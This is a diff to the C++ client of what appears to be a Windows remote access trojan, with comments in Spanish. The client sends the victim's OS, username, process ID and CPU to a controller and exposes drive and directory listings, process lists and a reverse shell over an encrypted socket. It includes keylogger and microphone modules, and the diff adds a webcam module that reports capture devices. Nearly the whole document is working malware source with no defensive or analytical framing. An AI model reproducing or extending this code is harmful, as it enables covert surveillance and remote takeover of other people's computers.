@@ -2,6 +2,7 @@
 #include "mod_mic.hpp"
 #include "mod_file_manager.hpp"
 #include "mod_keylogger.hpp"
+#include "mod_camara.hpp"
 #include "misc.hpp"
 
 
@@ -116,11 +117,16 @@ void Cliente::MainLoop() {
         delete this->mod_Key;
         this->mod_Key = nullptr;
     }
+
+    if (this->mod_Cam != nullptr) {
+        delete this->mod_Cam;
+        this->mod_Cam = nullptr;
+    }
 }
 
 void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
-    std::vector<std::string> strIn = strSplit(std::string(pBuffer), '~', 1);
+    std::vector<std::string> strIn = strSplit(std::string(pBuffer), CMD_DEL, 1);
     if (strIn.size() == 0) {
         //No hay comandos
         return;
@@ -146,7 +152,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
-        strIn = strSplit(std::string(pBuffer), '~', 4);
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
         if(strIn.size() == 3){
 
             DebugPrint("[!] Descargando archivo en ruta " + strIn[1] + " | size: " + strIn[2]);
@@ -162,14 +168,14 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     DebugPrint("[SERVIDOR] " + std::string(pBuffer));
 
-    strIn = strSplit(std::string(pBuffer), '~', 4);
+    strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
 
     int iEnviado = 0;
     
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
         DebugPrint("[!]PING");
         std::string strComand = std::to_string(EnumComandos::PONG);
-        strComand.append(1, '\\');
+        strComand.append(1, CMD_DEL);
         iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
         return;
     }
@@ -183,7 +189,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Discos) {
         std::vector<struct sDrives> vDrives = Drives();
         std::string strDipositivos = std::to_string(EnumComandos::FM_Discos_Lista);
-        strDipositivos.append(1, '\\');
+        strDipositivos.append(1, CMD_DEL);
         for (auto dev : vDrives) {
             std::string sLetter = dev.cLetter;
             std::string sFree = std::to_string(dev.dFree);
@@ -197,7 +203,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strTemp += sFree.substr(0, sFree.length() - 4);
             strTemp.append(1, '|');
             strTemp += sTotal.substr(0, sTotal.length() - 4);
-            strTemp.append(1, '\\');
+            strTemp.append(1, CMD_DEL);
 
             strDipositivos += strTemp;
         }
@@ -213,7 +219,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         if (strIn[1] == "DESCAR-DOWN") {
             strPath = this->ObtenerDown();
             std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
-            strPathBCDown.append(1, '\\');
+            strPathBCDown.append(1, CMD_DEL);
             strPathBCDown += strPath;
             //Enviar ruta del directorio al servidor
             this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
@@ -221,7 +227,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         } else if (strIn[1] == "ESCRI-DESK") {
             strPath = this->ObtenerDesk();
             std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
-            strPathBCDesk.append(1, '\\');
+            strPathBCDesk.append(1, CMD_DEL);
             strPathBCDesk += strPath;
             //lios mismo aqui
             this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
@@ -231,7 +237,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         }
         for (auto item : vDir(strPath.c_str())) {
             std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
-            strCommand.append(1, '\\');
+            strCommand.append(1, CMD_DEL);
             strCommand.append(item);
             this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
             Sleep(30);
@@ -300,7 +306,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Refrescar) {
         std::string strProc = std::to_string(EnumComandos::PM_Lista);
-        strProc.append(1, '\\');
+        strProc.append(1, CMD_DEL);
         strProc += strProcessList();
         iEnviado = this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
         return;
@@ -332,6 +338,36 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             delete this->mod_Key;
             this->mod_Key = nullptr;
         }
+        return;
+    }
+    //#####################################################
+
+
+    //#####################################################
+    //#####################################################
+    //#                   CAMARA                          #
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Lista) {
+        //Enviar lista de camaras
+        if (!this->mod_Cam) {
+            this->mod_Cam = new mod_Camera();
+        }
+
+        std::string strPaquete = std::to_string(EnumComandos::CM_Lista_Salida);
+        strPaquete.append(1, CMD_DEL);
+
+        std::vector<char*> cDev = this->mod_Cam->ListNameCaptureDevices();
+        if (cDev.size() > 0) {
+            for (auto cDevice : cDev) {
+                strPaquete += cDevice;
+                strPaquete.append(1, '|');
+            }
+            strPaquete = strPaquete.substr(0, strPaquete.size() - 1);
+        } else {
+            strPaquete += "Nica|Nica2 :v";
+        }
+        DebugPrint(strPaquete);
+        iEnviado = this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);
+
         return;
     }
     //#####################################################
@@ -407,25 +443,24 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         return;
     }
 
-    DebugPrint("[!] Enviados " + std::to_string(iEnviado));
 }
 
 
 void Cliente::iniPacket() {
     //Enviar SO
-    std::string strOut = "01\\";
+    std::string strOut = "01";
+    strOut.append(1, CMD_DEL);
     strOut += strOS();
-    strOut.append(1, '\\');
+    strOut.append(1, CMD_DEL);
     strOut += strUserName();
-    strOut.append(1, '\\');
+    strOut.append(1, CMD_DEL);
     strOut += std::to_string(GetCurrentProcessId());
-    strOut.append(1, '\\');
+    strOut.append(1, CMD_DEL);
     strOut += strCpu();
     
     int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false);
-#ifdef ___DEBUG_
-    std::cout << "Enviados " << iB << " bytes - "<< strOut <<"\n";
-#endif
+    
+    DebugPrint("[INIT]Enviados " + std::to_string(iB) + " bytes");
 }
 
 int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
@@ -441,16 +476,11 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     }
     int iEnviado = 0;
     if (isBlock) {
-#ifdef ___DEBUG_
-        //std::cout << "[BLOCK-MODE] send" << iDataSize << " bytes\n";
-#endif
+
         //Hacer el socket block
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-#ifdef ___DEBUG_
-            std::cout << "No se pudo hacer block\n";
-            error();
-#endif
+            DebugPrint("No se pudo hacer block");
         }
         
         std::unique_lock<std::mutex> lock(this->sck_mutex);
@@ -461,9 +491,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         if (!this->BLOCK_MODE) {
             iBlock = 1;
             if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-#ifdef ___DEBUG_
-                error();
-#endif
+                DebugPrint("No se pudo restaurar el block_mode del socket");
             }
         }
         
@@ -493,17 +521,11 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         //Hacer el socket block
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-#ifdef ___DEBUG_
-            std::cout << "No se pudo hacer block\n";
-            error();
-#endif
+            DebugPrint("No se pudo hacer block");
         }
-        //std::unique_lock<std::mutex> lock(this->sck_mutex);
-        //std::cout << "RECV LOCKED\n";
+        
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
-        //lock.unlock();
-        //std::cout << "RECV UNLOCKED\n";
-
+        
         if (iRecibido <= 0) {
             if (cTmpBuff) {
                 ZeroMemory(cTmpBuff, pLen);
@@ -524,9 +546,7 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         if (!this->BLOCK_MODE) {
             iBlock = 1;
             if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
-#ifdef ___DEBUG_
-                error();
-#endif
+                DebugPrint("No se pudo restaurar el block_mode en el socket");
             }
         }
         if (cTmpBuff) {
@@ -534,14 +554,9 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
             delete[] cTmpBuff;
         }
         return iRecibido;
-    }
-    else {
-        //std::unique_lock<std::mutex> lock(this->sck_mutex);
-        //std::cout << "RECV LOCKED\n";
+    }else {
         iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
-        //lock.unlock();
-        //std::cout << "RECV UNLOCKED\n";
-
+        
         if (iRecibido <= 0) {
             if (cTmpBuff) {
                 ZeroMemory(cTmpBuff, pLen);
@@ -605,7 +620,7 @@ ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
     if (enc_len <= 0) {
-        std::cout << "Error encriptando " << pInput << "\n";
+        DebugPrint("Error encriptando " + std::string((const char*)pInput));
     }
     return bOutput;
 }
@@ -615,7 +630,7 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
     if (dec_len <= 0) {
-        std::cout << "Error desencriptando " << pInput << "\n";
+        DebugPrint("Error desencriptando " + std::string((const char*)pInput));
     }
     return bOutput;
 }
@@ -623,20 +638,15 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
 //Reverse shell
 
 bool ReverseShell::SpawnShell(const char* pstrComando) {
-#ifdef ___DEBUG_
-    std::cout << "Lanzando " << pstrComando << "\n";
-#endif
-    
+    DebugPrint("Lanzando " + std::string(pstrComando));
+
     this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
     if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
-#ifdef ___DEBUG_
-        std::cout << "Error creando tuberias\n";
-        error();
-#endif
+        DebugPrint("Error creando tuberias");
         return false;
     }
     STARTUPINFO si;
@@ -648,18 +658,17 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     si.hStdInput = this->stdinRd;
 
     if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
-#ifdef ___DEBUG_
-        std::cout << "No se pudo spawnear la shell\n";
-        error();
-#endif
+        DebugPrint("No se pudo spawnear la shell");
         return false;
     }
     
     //La shell esta corriendo
     this->isRunning = true;
-    std::cout << "Running...\n";
+    DebugPrint("Running!");
     if (this->copy_ptr != nullptr) {
-        this->copy_ptr->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
+        std::string strRun = "04" + CMD_DEL;
+        strRun += "RU";
+        this->copy_ptr->cSend(this->sckSocket, strRun.c_str(), strRun.size(), 0, false);
     }
     
     this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
@@ -678,7 +687,8 @@ void ReverseShell::TerminarShell() {
     }
 
     std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
-    strComando += "\\Done...";
+    strComando += CMD_DEL;
+    strComando += "Done...";
     this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false);
 
     TerminateProcess(this->pi.hProcess, 0);
@@ -722,7 +732,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             cBuffer2[dBytesToWrite] = '\0';
 
             std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
-            strOut.append(1, '\\');
+            strOut.append(1, CMD_DEL);
             strOut += cBuffer2;
         
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
@@ -743,10 +753,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             break;
         }
     }
-#ifdef ___DEBUG_
-    std::cout<<"[!]thLeerShell finalizada"<<std::endl;
-    error();
-#endif
+    DebugPrint("[!]thLeerShell finalizada");
 }
 
 void ReverseShell::thEscribirShell(std::string pStrInput) {
@@ -759,10 +766,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
     if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
-#ifdef ___DEBUG_
-        std::cout << "Error escribiendo a la tuberia\n-DATA: " << pStrInput << std::endl;
-        error();
-#endif
+        DebugPrint("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
         std::unique_lock<std::mutex> lock(this->mutex_shell);
         this->isRunning = false;
         lock.unlock();
